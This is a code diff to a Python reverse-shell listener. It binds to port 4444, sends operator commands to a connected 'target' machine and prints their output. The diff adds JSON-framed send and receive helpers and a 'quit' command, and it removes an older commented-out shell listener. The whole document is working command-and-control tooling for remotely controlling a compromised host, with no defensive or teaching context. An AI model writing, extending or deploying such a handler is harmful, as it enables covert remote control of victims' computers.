@@ -1,4 +1,5 @@
 import socket
+import json
 
 
 class Listener:
@@ -18,35 +19,28 @@ class Listener:
             print(output)
 
     def execute_remotely(self, command):
-        self.target.send(command.encode())
-        receive = self.target.recv(1024).decode()
-        return receive
+        self.reliable_send(command)
+        command_split = command.split()
+        if command_split[0] == "quit":
+            self.target.close()
+            exit()
+        else:
+            receive = self.reliable_receive()
+            return receive
+
+    def reliable_send(self, data):
+        json_data = json.dumps(data)
+        self.target.send(json_data.encode())
+
+    def reliable_receive(self):
+        data = ''
+        while True:
+            try:
+                data = data + self.target.recv(1024).decode().rstrip()
+                return json.loads(data)
+            except ValueError:
+                continue
 
 
 client = Listener('0.0.0.0', 4444)
 client.run()
-
-# def shell(computer, address):
-#     while True:
-#         command = input(f"Shell@{address[0]}~  ")
-#         computer.send(command.encode())
-#         receive_output(computer)
-#
-#
-# def receive_output(computer):
-#     receive = computer.recv(1024).decode()
-#     print(f"#output {receive}")
-#
-#
-# socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-# socket.bind(('0.0.0.0', 5555))
-# print("# Listening for stuff")
-# socket.listen(5)
-#
-# target, ip = socket.accept()
-# print(f"Connected from {ip}")
-#
-# shell(target, ip)
-#
-# # closed the connection
-# socket.close()
